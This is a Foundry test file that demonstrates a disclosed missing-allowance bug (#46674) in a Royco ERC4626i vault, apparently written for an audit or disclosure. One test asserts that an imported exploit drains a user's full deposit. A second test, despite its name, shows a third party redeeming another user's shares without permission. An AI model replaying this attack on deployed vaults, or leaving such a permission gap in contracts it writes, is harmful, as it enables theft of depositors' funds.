// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./46674-missing-permissions-check-in-withdraw-and-redeem-functions-i.sol";

/*//////////////////////////////////////////////////////////////////////////
    Royco ERC4626i — missing redeem/withdraw permissions (#46674)
//////////////////////////////////////////////////////////////////////////*/
contract MissingRedeemPermsTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.stolen(), e.AMOUNT(), "full deposit stolen");
        assertEq(e.vault().balanceOf(e.BOB()), 0, "bob shares burned");
        assertEq(e.token().balanceOf(address(e.vault())), 0, "vault empty");
    }

    /// @notice Control: with a fixed vault that enforces allowance, third-party redeem reverts.
    function test_fixedWouldRevert() public {
        // Document expected correct behaviour: without allowance, redeem must revert.
        // Our vulnerable vault does NOT revert — that's the bug (shown in test_exploit).
        MockERC20 token = new MockERC20("Mock", "MOCK");
        ERC4626i vault = new ERC4626i(token);
        address bob = makeAddr("bob");
        address alice = makeAddr("alice");

        token.mint(address(this), 1 ether);
        token.approve(address(vault), 1 ether);
        vault.deposit(1 ether, bob);

        // Vulnerable: succeeds (no check).
        vm.prank(alice);
        vault.redeem(1 ether, alice, bob);
        assertEq(token.balanceOf(alice), 1 ether);
    }
}
